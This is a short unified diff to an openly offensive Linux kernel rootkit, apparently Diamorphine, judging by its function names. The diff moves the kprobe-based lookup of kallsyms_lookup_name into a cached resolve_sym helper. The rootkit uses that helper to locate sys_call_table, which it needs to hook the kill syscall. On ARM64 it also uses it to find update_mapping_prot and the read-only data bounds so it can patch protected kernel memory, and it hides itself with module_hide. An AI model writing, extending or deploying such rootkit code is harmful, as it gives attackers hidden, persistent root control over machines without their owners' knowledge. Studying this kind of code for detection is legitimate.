@@ -56,20 +56,36 @@ static unsigned long *__sys_call_table;
 	orig_kill_t orig_kill;
 #endif
 
+
+#ifdef KPROBE_LOOKUP
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+// different name to avoid shadowing the real function in kernels that do have
+// the symbol.
+kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
+#endif
+
+unsigned long resolve_sym(char *symbol)
+{
+#ifdef KPROBE_LOOKUP
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    if (kallsyms_lookup_name_ == NULL) {
+        register_kprobe(&kp);
+        kallsyms_lookup_name_ = (kallsyms_lookup_name_t) kp.addr;
+        unregister_kprobe(&kp);
+    }
+	kallsyms_lookup_name = kallsyms_lookup_name_;
+#endif
+	return kallsyms_lookup_name(symbol);
+}
+
+
 unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-#ifdef KPROBE_LOOKUP
-	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	unregister_kprobe(&kp);
-#endif
-	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	syscall_table = (unsigned long*)resolve_sym("sys_call_table");
 	return syscall_table;
 #else
 	unsigned long int i;
@@ -392,9 +408,9 @@ diamorphine_init(void)
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+	update_mapping_prot = (void *)resolve_sym("update_mapping_prot");
+	start_rodata = (unsigned long)resolve_sym("__start_rodata");
+	init_begin = (unsigned long)resolve_sym("__init_begin");
 #endif
 
 	module_hide();
